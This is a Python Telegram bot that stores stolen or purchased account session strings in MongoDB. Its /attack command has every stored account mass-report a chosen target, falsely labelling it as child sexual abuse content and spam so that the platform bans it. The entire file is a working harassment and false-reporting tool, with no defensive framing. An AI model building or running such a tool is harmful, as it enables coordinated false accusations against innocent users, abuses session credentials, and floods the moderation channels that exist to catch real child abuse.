import os
import asyncio
import pymongo
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import ReportRequest
from telethon.tl.types import InputReportReasonChildAbuse, InputReportReasonSpam, InputReportReasonViolence
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

load_dotenv()
BOT_TOKEN = os.getenv('BOT_TOKEN')
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
MONGO_URL = os.getenv('MONGO_URL')
ADMIN_ID = int(os.getenv('ADMIN_ID'))

db_client = pymongo.MongoClient(MONGO_URL)
db = db_client['report_bot_db']
sessions_col = db['sessions']

# Users ka state track karne ke liye
ADDING_SESSIONS = {}

async def make_config(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    ADDING_SESSIONS[update.effective_user.id] = True
    await update.message.reply_text("📥 **Session Adding Mode ON**\n\nAb jitne bhi String Sessions hain, ek-ek karke bhejte rahiye. Jab khatam ho jayein toh `/done` likh dena.")

async def handle_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID or user_id not in ADDING_SESSIONS: return

    text = update.message.text.strip()

    if text.lower() == '/done':
        del ADDING_SESSIONS[user_id]
        count = sessions_col.count_documents({})
        await update.message.reply_text(f"✅ **Done!** Saare valid sessions save ho chuke hain.\n📊 Total Accounts: {count}")
        return

    # Session validate aur save karna
    session_str = text
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        if await client.is_user_authorized():
            me = await client.get_me()
            if not sessions_col.find_one({"session": session_str}):
                sessions_col.insert_one({"session": session_str, "user": me.first_name})
                await update.message.reply_text(f"🔹 Saved: {me.first_name} (Active)")
            else:
                await update.message.reply_text("⚠️ Already in Database.")
        await client.disconnect()
    except Exception as e:
        await update.message.reply_text(f"❌ Invalid Session: {str(e)[:50]}...")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("❌ Usage: `/attack @target`")
        return

    target = context.args[0]
    all_sessions = list(sessions_col.find())
    await update.message.reply_text(f"🚀 **Attack Started on {target}**\nUsing {len(all_sessions)} accounts...")

    success = 0
    for data in all_sessions:
        try:
            client = TelegramClient(StringSession(data['session']), API_ID, API_HASH)
            await client.connect()
            peer = await client.get_entity(target)

            # Report 1 (Account Level)
            await client(ReportRequest(peer=peer, id=[0], reason=InputReportReasonChildAbuse(), message="CSAM Content"))
            # Report 2 (Message Level)
            msgs = await client.get_messages(peer, limit=1)
            if msgs:
                await client(ReportRequest(peer=peer, id=[msgs[0].id], reason=InputReportReasonSpam(), message="Scam activity"))
            
            success += 1
            await client.disconnect()
            await asyncio.sleep(2) 
        except: continue

    await update.message.reply_text(f"🏁 **Attack Finished!**\n✅ Reports Sent: {success}")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("make_config", make_config))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sessions))
    print("Bot is ready...")
    app.run_polling()

if __name__ == '__main__':
    main()
